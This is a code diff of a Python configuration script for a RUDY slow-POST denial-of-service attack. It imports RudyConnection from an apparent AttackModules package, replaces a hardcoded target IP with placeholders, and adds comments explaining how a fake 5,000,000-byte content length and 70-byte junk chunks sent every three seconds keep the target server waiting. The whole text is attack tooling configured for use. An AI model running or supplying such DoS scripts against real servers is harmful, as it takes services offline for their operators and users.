@@ -2,13 +2,13 @@ from AttackModules import ThreadMaker, RudyConnection
 from time import sleep
 import threading
 
-target = "192.168.1.4"
-port = 80
-thread_count = 1 
-uri = "upload"
-content_len = 5000000
-chunksize = 70
-timeInterval = 3
+target = <Target-IP>
+port = <Target-port>
+session_count = 1 #how many connections do you want for this senario
+uri = "upload"   #Address for uploading your content 
+content_len = 5000000   #you should tell the target how much is your overall data (this is fake, we just want target to wait for all of packets of size:'chunksize' to be arrived)
+chunksize = 70   #when sending junk-packets how much raw-bytes should be sent
+timeInterval = 3 #how much this script should wait for next packet to send to target
 
 
 headers = {   
@@ -27,7 +27,7 @@ headers = {
 
 
 
-
+thread_count = session_count 
 rd = RudyConnection()
 f = rd.create_slowconnection_single
 arguments = {}
